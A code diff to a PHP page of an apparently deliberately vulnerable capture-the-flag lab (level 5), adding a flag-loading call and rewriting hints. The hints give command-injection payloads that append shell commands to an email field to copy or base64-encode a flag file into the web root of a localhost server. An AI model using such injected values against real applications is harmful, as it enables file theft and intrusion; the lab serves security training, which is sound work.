@@ -21,6 +21,10 @@
             
             <?php
             if (isset($_GET['email'])) {
+                // Initialize level-specific flag access
+                require_once 'flag_system.php';
+                get_level_flag(5);
+                
                 echo '<h3>📊 Result:</h3>';
                 echo '<div class="result">';
                 
@@ -133,12 +137,12 @@
                 </div>
                 <div id="hint-7" class="hint-box" style="display: none;">
                     <h4>🎯 Hint 7: Extract the Flag!</h4>
-                    <p><strong>🚀 Target file:</strong> <code>/var/flags/level5_proof.txt</code></p>
-                    <p><strong>Method 1 (Direct copy):</strong> <code>user@google.com; cp /var/flags/level5_proof.txt /var/www/html/</code></p>
-                    <p><strong>Method 2 (Redirect):</strong> <code>user@google.com; cat /var/flags/level5_proof.txt > /var/www/html/flag.txt</code></p>
-                    <p><strong>Method 3 (Base64):</strong> <code>user@google.com; base64 /var/flags/level5_proof.txt > /var/www/html/encoded.txt</code></p>
+                    <p><strong>🚀 Target file:</strong> <code>/tmp/level5_flag.txt</code></p>
+                    <p><strong>Method 1 (Direct copy):</strong> <code>user@google.com; cp /tmp/level5_flag.txt /var/www/html/</code></p>
+                    <p><strong>Method 2 (Redirect):</strong> <code>user@google.com; cat /tmp/level5_flag.txt > /var/www/html/flag.txt</code></p>
+                    <p><strong>Method 3 (Base64):</strong> <code>user@google.com; base64 /tmp/level5_flag.txt > /var/www/html/encoded.txt</code></p>
                     <p><strong>🔍 Access your extracted file:</strong></p>
-                    <p>After successful injection, visit: <code>http://localhost:8080/flag.txt</code></p>
+                    <p>After successful injection, visit: <code>http://localhost:8080/level5_flag.txt</code></p>
                     <p><strong>💡 Verification first:</strong> <code>user@google.com; echo "test" > /var/www/html/test.txt</code></p>
                 </div>
             </div>
